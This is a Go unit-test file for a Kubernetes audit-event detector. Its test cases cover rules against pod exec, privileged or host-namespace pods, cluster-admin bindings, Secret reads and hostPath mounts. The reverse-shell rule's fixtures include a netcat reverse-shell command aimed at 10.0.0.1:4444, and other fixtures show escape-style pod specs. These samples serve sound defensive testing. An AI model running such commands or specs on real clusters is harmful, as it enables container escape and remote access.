package kube

import (
	"encoding/json"
	"testing"

	"github.com/imkerbos/mxsec-platform/internal/server/model"
)

// TestKubeDetectorRules 测试 Kube Audit 事件 → 规则匹配
// 模拟 kube audit → detector → kube_alarms 链路中的规则匹配部分
func TestKubeDetectorRules(t *testing.T) {
	// 直接构造检测器获取规则列表
	d := &KubeDetector{}
	d.registerRules()

	if len(d.rules) != 8 {
		t.Fatalf("期望 8 条规则，实际 %d", len(d.rules))
	}

	tests := []struct {
		name      string
		ruleID    string
		event     *model.AuditEvent
		wantMatch bool
	}{
		// K8S-001: kubectl exec 进入容器
		{
			name:   "K8S-001 匹配 - exec 进入容器",
			ruleID: "K8S-001",
			event: &model.AuditEvent{
				Verb:      "create",
				User:      model.AuditUser{Username: "admin"},
				ObjectRef: &model.AuditObjectRef{Resource: "pods", Name: "nginx", Namespace: "default", Subresource: "exec"},
			},
			wantMatch: true,
		},
		{
			name:   "K8S-001 不匹配 - 非 exec",
			ruleID: "K8S-001",
			event: &model.AuditEvent{
				Verb:      "create",
				ObjectRef: &model.AuditObjectRef{Resource: "pods", Name: "nginx", Subresource: "log"},
			},
			wantMatch: false,
		},

		// K8S-002: hostNetwork/hostPID
		{
			name:   "K8S-002 匹配 - hostNetwork Pod",
			ruleID: "K8S-002",
			event: &model.AuditEvent{
				Verb:       "create",
				ObjectRef:  &model.AuditObjectRef{Resource: "pods", Name: "evil-pod", Namespace: "default"},
				RequestObj: json.RawMessage(`{"spec":{"hostNetwork":true}}`),
			},
			wantMatch: true,
		},
		{
			name:   "K8S-002 匹配 - hostPID Pod",
			ruleID: "K8S-002",
			event: &model.AuditEvent{
				Verb:       "create",
				ObjectRef:  &model.AuditObjectRef{Resource: "pods", Name: "evil-pod"},
				RequestObj: json.RawMessage(`{"spec":{"hostPID":true}}`),
			},
			wantMatch: true,
		},
		{
			name:   "K8S-002 不匹配 - 普通 Pod",
			ruleID: "K8S-002",
			event: &model.AuditEvent{
				Verb:       "create",
				ObjectRef:  &model.AuditObjectRef{Resource: "pods", Name: "normal-pod"},
				RequestObj: json.RawMessage(`{"spec":{}}`),
			},
			wantMatch: false,
		},

		// K8S-003: ClusterRoleBinding（只对高权限角色告警）
		{
			name:   "K8S-003 匹配 - 绑定 cluster-admin",
			ruleID: "K8S-003",
			event: &model.AuditEvent{
				Verb:       "create",
				User:       model.AuditUser{Username: "hacker"},
				ObjectRef:  &model.AuditObjectRef{Resource: "clusterrolebindings", Name: "admin-binding"},
				RequestObj: json.RawMessage(`{"roleRef":{"kind":"ClusterRole","name":"cluster-admin"}}`),
			},
			wantMatch: true,
		},
		{
			name:   "K8S-003 匹配 - 绑定 system:kubelet-admin",
			ruleID: "K8S-003",
			event: &model.AuditEvent{
				Verb:       "create",
				User:       model.AuditUser{Username: "hacker"},
				ObjectRef:  &model.AuditObjectRef{Resource: "clusterrolebindings", Name: "evil-binding"},
				RequestObj: json.RawMessage(`{"roleRef":{"kind":"ClusterRole","name":"system:kubelet-admin"}}`),
			},
			wantMatch: true,
		},
		{
			name:   "K8S-003 不匹配 - 绑定 view 角色",
			ruleID: "K8S-003",
			event: &model.AuditEvent{
				Verb:       "create",
				ObjectRef:  &model.AuditObjectRef{Resource: "clusterrolebindings", Name: "viewer-binding"},
				RequestObj: json.RawMessage(`{"roleRef":{"kind":"ClusterRole","name":"view"}}`),
			},
			wantMatch: false,
		},
		{
			name:   "K8S-003 不匹配 - 绑定自定义普通角色",
			ruleID: "K8S-003",
			event: &model.AuditEvent{
				Verb:       "create",
				ObjectRef:  &model.AuditObjectRef{Resource: "clusterrolebindings", Name: "app-binding"},
				RequestObj: json.RawMessage(`{"roleRef":{"kind":"ClusterRole","name":"my-app-reader"}}`),
			},
			wantMatch: false,
		},
		{
			name:   "K8S-003 不匹配 - 删除 ClusterRoleBinding",
			ruleID: "K8S-003",
			event: &model.AuditEvent{
				Verb:      "delete",
				ObjectRef: &model.AuditObjectRef{Resource: "clusterrolebindings", Name: "admin-binding"},
			},
			wantMatch: false,
		},

		// K8S-004: 访问 Secret（排除系统身份）
		{
			name:   "K8S-004 匹配 - 普通用户 get Secret",
			ruleID: "K8S-004",
			event: &model.AuditEvent{
				Verb:      "get",
				User:      model.AuditUser{Username: "alice"},
				ObjectRef: &model.AuditObjectRef{Resource: "secrets", Name: "db-password", Namespace: "prod"},
			},
			wantMatch: true,
		},
		{
			name:   "K8S-004 匹配 - list Secret",
			ruleID: "K8S-004",
			event: &model.AuditEvent{
				Verb:      "list",
				User:      model.AuditUser{Username: "bob"},
				ObjectRef: &model.AuditObjectRef{Resource: "secrets", Namespace: "prod"},
			},
			wantMatch: true,
		},
		{
			name:   "K8S-004 不匹配 - create Secret",
			ruleID: "K8S-004",
			event: &model.AuditEvent{
				Verb:      "create",
				ObjectRef: &model.AuditObjectRef{Resource: "secrets", Name: "new-secret"},
			},
			wantMatch: false,
		},
		{
			name:   "K8S-004 不匹配 - kubelet 访问 Secret（系统身份）",
			ruleID: "K8S-004",
			event: &model.AuditEvent{
				Verb:      "get",
				User:      model.AuditUser{Username: "system:node:worker-1"},
				ObjectRef: &model.AuditObjectRef{Resource: "secrets", Name: "kubelet-ca", Namespace: "prod"},
			},
			wantMatch: false,
		},
		{
			name:   "K8S-004 不匹配 - kube-apiserver 访问 Secret",
			ruleID: "K8S-004",
			event: &model.AuditEvent{
				Verb:      "list",
				User:      model.AuditUser{Username: "system:apiserver"},
				ObjectRef: &model.AuditObjectRef{Resource: "secrets", Namespace: "prod"},
			},
			wantMatch: false,
		},

		// K8S-005: 创建特权容器
		{
			name:   "K8S-005 匹配 - privileged 容器",
			ruleID: "K8S-005",
			event: &model.AuditEvent{
				Verb:       "create",
				ObjectRef:  &model.AuditObjectRef{Resource: "pods", Name: "priv-pod"},
				RequestObj: json.RawMessage(`{"spec":{"containers":[{"securityContext":{"privileged":true}}]}}`),
			},
			wantMatch: true,
		},
		{
			name:   "K8S-005 不匹配 - 非特权容器",
			ruleID: "K8S-005",
			event: &model.AuditEvent{
				Verb:       "create",
				ObjectRef:  &model.AuditObjectRef{Resource: "pods", Name: "normal-pod"},
				RequestObj: json.RawMessage(`{"spec":{"containers":[{"securityContext":{}}]}}`),
			},
			wantMatch: false,
		},

		// K8S-006: ServiceAccount Token 异常使用
		{
			name:   "K8S-006 匹配 - 异常 UserAgent + SA",
			ruleID: "K8S-006",
			event: &model.AuditEvent{
				Verb:      "get",
				User:      model.AuditUser{Username: "system:serviceaccount:default:my-sa"},
				UserAgent: "python-requests/2.28",
				ObjectRef: &model.AuditObjectRef{Resource: "pods"},
			},
			wantMatch: true,
		},
		{
			name:   "K8S-006 不匹配 - 标准 kubectl",
			ruleID: "K8S-006",
			event: &model.AuditEvent{
				Verb:      "get",
				User:      model.AuditUser{Username: "system:serviceaccount:default:my-sa"},
				UserAgent: "kubectl/v1.28.0",
				ObjectRef: &model.AuditObjectRef{Resource: "pods"},
			},
			wantMatch: false,
		},
		{
			name:   "K8S-006 不匹配 - 非 SA 用户",
			ruleID: "K8S-006",
			event: &model.AuditEvent{
				Verb:      "get",
				User:      model.AuditUser{Username: "admin"},
				UserAgent: "curl/7.88",
				ObjectRef: &model.AuditObjectRef{Resource: "pods"},
			},
			wantMatch: false,
		},
		{
			name:   "K8S-006 不匹配 - cert-manager UserAgent",
			ruleID: "K8S-006",
			event: &model.AuditEvent{
				Verb:      "get",
				User:      model.AuditUser{Username: "system:serviceaccount:cert-manager:cert-manager"},
				UserAgent: "cert-manager/v1.12.0",
				ObjectRef: &model.AuditObjectRef{Resource: "secrets"},
			},
			wantMatch: false,
		},
		{
			name:   "K8S-006 不匹配 - prometheus UserAgent",
			ruleID: "K8S-006",
			event: &model.AuditEvent{
				Verb:      "list",
				User:      model.AuditUser{Username: "system:serviceaccount:monitoring:prometheus"},
				UserAgent: "prometheus/v2.45.0",
				ObjectRef: &model.AuditObjectRef{Resource: "pods"},
			},
			wantMatch: false,
		},
		{
			name:   "K8S-006 不匹配 - argo-workflows UserAgent",
			ruleID: "K8S-006",
			event: &model.AuditEvent{
				Verb:      "create",
				User:      model.AuditUser{Username: "system:serviceaccount:argo:argo"},
				UserAgent: "argo/v3.5.0",
				ObjectRef: &model.AuditObjectRef{Resource: "workflows"},
			},
			wantMatch: false,
		},

		// K8S-007: 容器内反弹 Shell
		{
			name:   "K8S-007 匹配 - exec bash",
			ruleID: "K8S-007",
			event: &model.AuditEvent{
				Verb:       "create",
				ObjectRef:  &model.AuditObjectRef{Resource: "pods", Name: "victim", Subresource: "exec"},
				RequestObj: json.RawMessage(`{"command":["/bin/bash","-i"]}`),
			},
			wantMatch: true,
		},
		{
			name:   "K8S-007 匹配 - exec nc",
			ruleID: "K8S-007",
			event: &model.AuditEvent{
				Verb:       "create",
				ObjectRef:  &model.AuditObjectRef{Resource: "pods", Name: "victim", Subresource: "exec"},
				RequestObj: json.RawMessage(`{"command":["nc ","-e","/bin/sh","10.0.0.1","4444"]}`),
			},
			wantMatch: true,
		},
		{
			name:   "K8S-007 不匹配 - exec ls",
			ruleID: "K8S-007",
			event: &model.AuditEvent{
				Verb:       "create",
				ObjectRef:  &model.AuditObjectRef{Resource: "pods", Name: "pod1", Subresource: "exec"},
				RequestObj: json.RawMessage(`{"command":["ls","-la"]}`),
			},
			wantMatch: false,
		},

		// K8S-008: 挂载宿主机路径
		{
			name:   "K8S-008 匹配 - 挂载根路径",
			ruleID: "K8S-008",
			event: &model.AuditEvent{
				Verb:       "create",
				ObjectRef:  &model.AuditObjectRef{Resource: "pods", Name: "escape-pod"},
				RequestObj: json.RawMessage(`{"spec":{"volumes":[{"hostPath":{"path":"/"}}]}}`),
			},
			wantMatch: true,
		},
		{
			name:   "K8S-008 匹配 - 挂载 docker.sock",
			ruleID: "K8S-008",
			event: &model.AuditEvent{
				Verb:       "create",
				ObjectRef:  &model.AuditObjectRef{Resource: "pods", Name: "docker-pod"},
				RequestObj: json.RawMessage(`{"spec":{"volumes":[{"hostPath":{"path":"/var/run/docker.sock"}}]}}`),
			},
			wantMatch: true,
		},
		{
			name:   "K8S-008 不匹配 - 挂载安全路径",
			ruleID: "K8S-008",
			event: &model.AuditEvent{
				Verb:       "create",
				ObjectRef:  &model.AuditObjectRef{Resource: "pods", Name: "safe-pod"},
				RequestObj: json.RawMessage(`{"spec":{"volumes":[{"hostPath":{"path":"/data/app"}}]}}`),
			},
			wantMatch: false,
		},

		// 边界测试
		{
			name:      "空 ObjectRef 不匹配任何规则",
			ruleID:    "K8S-001",
			event:     &model.AuditEvent{Verb: "create"},
			wantMatch: false,
		},
	}

	// 构建 ruleID → rule 索引
	ruleIndex := make(map[string]DetectionRule)
	for _, r := range d.rules {
		ruleIndex[r.ID] = r
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rule, ok := ruleIndex[tt.ruleID]
			if !ok {
				t.Fatalf("规则 %s 不存在", tt.ruleID)
			}
			got := rule.Match(tt.event)
			if got != tt.wantMatch {
				t.Errorf("规则 %s 匹配结果 = %v, want %v", tt.ruleID, got, tt.wantMatch)
			}
		})
	}
}

// TestBuildAlarmMessage 测试告警消息构建
func TestBuildAlarmMessage(t *testing.T) {
	tests := []struct {
		name         string
		ruleID       string
		event        *model.AuditEvent
		wantContains string
	}{
		{
			name:   "K8S-001 消息包含用户名和容器名",
			ruleID: "K8S-001",
			event: &model.AuditEvent{
				User:      model.AuditUser{Username: "admin"},
				ObjectRef: &model.AuditObjectRef{Name: "nginx", Namespace: "prod"},
			},
			wantContains: "admin",
		},
		{
			name:   "K8S-005 消息包含特权容器提示",
			ruleID: "K8S-005",
			event: &model.AuditEvent{
				User:      model.AuditUser{Username: "deployer"},
				ObjectRef: &model.AuditObjectRef{Name: "priv-pod", Namespace: "default"},
			},
			wantContains: "特权容器",
		},
		{
			name:   "无 ObjectRef 不 panic",
			ruleID: "K8S-001",
			event: &model.AuditEvent{
				User: model.AuditUser{Username: "test"},
			},
			wantContains: "test",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			msg := buildAlarmMessage(tt.ruleID, tt.event)
			if msg == "" {
				t.Error("消息不应为空")
			}
			if tt.wantContains != "" && !contains(msg, tt.wantContains) {
				t.Errorf("消息 %q 应包含 %q", msg, tt.wantContains)
			}
		})
	}
}

func contains(s, substr string) bool {
	return len(s) >= len(substr) && searchSubstring(s, substr)
}

func searchSubstring(s, sub string) bool {
	for i := 0; i <= len(s)-len(sub); i++ {
		if s[i:i+len(sub)] == sub {
			return true
		}
	}
	return false
}

// TestContainsHostAccess 测试 hostNetwork/hostPID 检测
func TestContainsHostAccess(t *testing.T) {
	tests := []struct {
		name    string
		request json.RawMessage
		want    bool
	}{
		{"hostNetwork", json.RawMessage(`{"spec":{"hostNetwork":true}}`), true},
		{"hostPID", json.RawMessage(`{"spec":{"hostPID":true}}`), true},
		{"hostIPC", json.RawMessage(`{"spec":{"hostIPC":true}}`), true},
		{"none", json.RawMessage(`{"spec":{}}`), false},
		{"invalid json", json.RawMessage(`invalid`), false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := containsHostAccess(tt.request); got != tt.want {
				t.Errorf("containsHostAccess() = %v, want %v", got, tt.want)
			}
		})
	}
}

// TestContainsPrivileged 测试特权容器检测
func TestContainsPrivileged(t *testing.T) {
	tests := []struct {
		name    string
		request json.RawMessage
		want    bool
	}{
		{
			"privileged true",
			json.RawMessage(`{"spec":{"containers":[{"securityContext":{"privileged":true}}]}}`),
			true,
		},
		{
			"privileged false",
			json.RawMessage(`{"spec":{"containers":[{"securityContext":{"privileged":false}}]}}`),
			false,
		},
		{
			"no security context",
			json.RawMessage(`{"spec":{"containers":[{}]}}`),
			false,
		},
		{
			"invalid json",
			json.RawMessage(`invalid`),
			false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := containsPrivileged(tt.request); got != tt.want {
				t.Errorf("containsPrivileged() = %v, want %v", got, tt.want)
			}
		})
	}
}

// TestShouldExcludeEvent 测试全局上下文排除
func TestShouldExcludeEvent(t *testing.T) {
	tests := []struct {
		name  string
		event *model.AuditEvent
		want  bool
	}{
		{
			name: "kube-system 命名空间事件应排除",
			event: &model.AuditEvent{
				Verb:      "create",
				User:      model.AuditUser{Username: "alice"},
				ObjectRef: &model.AuditObjectRef{Resource: "pods", Namespace: "kube-system"},
			},
			want: true,
		},
		{
			name: "kube-public 命名空间事件应排除",
			event: &model.AuditEvent{
				Verb:      "get",
				User:      model.AuditUser{Username: "alice"},
				ObjectRef: &model.AuditObjectRef{Resource: "configmaps", Namespace: "kube-public"},
			},
			want: true,
		},
		{
			name: "kube-node-lease 命名空间事件应排除",
			event: &model.AuditEvent{
				Verb:      "update",
				User:      model.AuditUser{Username: "system:node:worker-1"},
				ObjectRef: &model.AuditObjectRef{Resource: "leases", Namespace: "kube-node-lease"},
			},
			want: true,
		},
		{
			name: "kubelet 用户（system:node:）应排除",
			event: &model.AuditEvent{
				Verb:      "get",
				User:      model.AuditUser{Username: "system:node:worker-1"},
				ObjectRef: &model.AuditObjectRef{Resource: "secrets", Namespace: "default"},
			},
			want: true,
		},
		{
			name: "system:kube-controller-manager 应排除",
			event: &model.AuditEvent{
				Verb:      "update",
				User:      model.AuditUser{Username: "system:kube-controller-manager"},
				ObjectRef: &model.AuditObjectRef{Resource: "pods", Namespace: "default"},
			},
			want: true,
		},
		{
			name: "kubelet UserAgent 应排除",
			event: &model.AuditEvent{
				Verb:      "list",
				User:      model.AuditUser{Username: "alice"},
				UserAgent: "kubelet/v1.28.0 (linux/amd64) kubernetes/abcdef",
				ObjectRef: &model.AuditObjectRef{Resource: "pods", Namespace: "default"},
			},
			want: true,
		},
		{
			name: "kube-apiserver UserAgent 应排除",
			event: &model.AuditEvent{
				Verb:      "get",
				UserAgent: "kube-apiserver/v1.28.0",
				ObjectRef: &model.AuditObjectRef{Resource: "pods", Namespace: "default"},
			},
			want: true,
		},
		{
			name: "kube-system 内的 SA 应排除",
			event: &model.AuditEvent{
				Verb:      "get",
				User:      model.AuditUser{Username: "system:serviceaccount:kube-system:coredns"},
				ObjectRef: &model.AuditObjectRef{Resource: "endpoints", Namespace: "default"},
			},
			want: true,
		},
		{
			name: "普通用户 + default 命名空间不应排除",
			event: &model.AuditEvent{
				Verb:      "create",
				User:      model.AuditUser{Username: "alice"},
				UserAgent: "kubectl/v1.28.0",
				ObjectRef: &model.AuditObjectRef{Resource: "pods", Namespace: "default"},
			},
			want: false,
		},
		{
			name: "业务命名空间普通 SA 不应排除",
			event: &model.AuditEvent{
				Verb:      "get",
				User:      model.AuditUser{Username: "system:serviceaccount:prod:app-sa"},
				UserAgent: "my-app/v1.0",
				ObjectRef: &model.AuditObjectRef{Resource: "secrets", Namespace: "prod"},
			},
			want: false,
		},
		{
			name:  "nil 事件不应 panic",
			event: nil,
			want:  false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := shouldExcludeEvent(tt.event); got != tt.want {
				t.Errorf("shouldExcludeEvent() = %v, want %v", got, tt.want)
			}
		})
	}
}

// TestContainsHighPrivilegeRole 测试高权限角色识别
func TestContainsHighPrivilegeRole(t *testing.T) {
	tests := []struct {
		name    string
		request json.RawMessage
		want    bool
	}{
		{
			"cluster-admin",
			json.RawMessage(`{"roleRef":{"kind":"ClusterRole","name":"cluster-admin"}}`),
			true,
		},
		{
			"admin",
			json.RawMessage(`{"roleRef":{"kind":"ClusterRole","name":"admin"}}`),
			true,
		},
		{
			"edit",
			json.RawMessage(`{"roleRef":{"kind":"ClusterRole","name":"edit"}}`),
			true,
		},
		{
			"system:kubelet-admin",
			json.RawMessage(`{"roleRef":{"kind":"ClusterRole","name":"system:kubelet-admin"}}`),
			true,
		},
		{
			"view - not high priv",
			json.RawMessage(`{"roleRef":{"kind":"ClusterRole","name":"view"}}`),
			false,
		},
		{
			"custom role - not high priv",
			json.RawMessage(`{"roleRef":{"kind":"ClusterRole","name":"my-app-reader"}}`),
			false,
		},
		{
			"empty roleRef",
			json.RawMessage(`{}`),
			false,
		},
		{
			"invalid json",
			json.RawMessage(`invalid`),
			false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := containsHighPrivilegeRole(tt.request); got != tt.want {
				t.Errorf("containsHighPrivilegeRole() = %v, want %v", got, tt.want)
			}
		})
	}
}

// TestContainsHostPathMount 测试敏感路径挂载检测
func TestContainsHostPathMount(t *testing.T) {
	tests := []struct {
		name    string
		request json.RawMessage
		want    bool
	}{
		{
			"root path",
			json.RawMessage(`{"spec":{"volumes":[{"hostPath":{"path":"/"}}]}}`),
			true,
		},
		{
			"/etc",
			json.RawMessage(`{"spec":{"volumes":[{"hostPath":{"path":"/etc"}}]}}`),
			true,
		},
		{
			"/etc/kubernetes",
			json.RawMessage(`{"spec":{"volumes":[{"hostPath":{"path":"/etc/kubernetes"}}]}}`),
			true,
		},
		{
			"docker.sock",
			json.RawMessage(`{"spec":{"volumes":[{"hostPath":{"path":"/var/run/docker.sock"}}]}}`),
			true,
		},
		{
			"safe path",
			json.RawMessage(`{"spec":{"volumes":[{"hostPath":{"path":"/data/logs"}}]}}`),
			false,
		},
		{
			"no volumes",
			json.RawMessage(`{"spec":{}}`),
			false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := containsHostPathMount(tt.request); got != tt.want {
				t.Errorf("containsHostPathMount() = %v, want %v", got, tt.want)
			}
		})
	}
}
